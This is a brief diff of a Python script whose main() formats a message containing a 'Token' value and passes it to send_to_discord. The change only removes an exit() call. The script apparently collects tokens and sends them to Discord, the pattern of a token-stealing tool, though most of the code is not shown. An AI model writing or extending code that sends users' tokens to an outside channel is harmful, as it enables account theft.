@@ -129,8 +129,6 @@ def main():
 > :key: **Token**: `{token}`  
 """
             send_to_discord(embed)
-    
-    exit()
 
 if __name__ == "__main__":
     main()
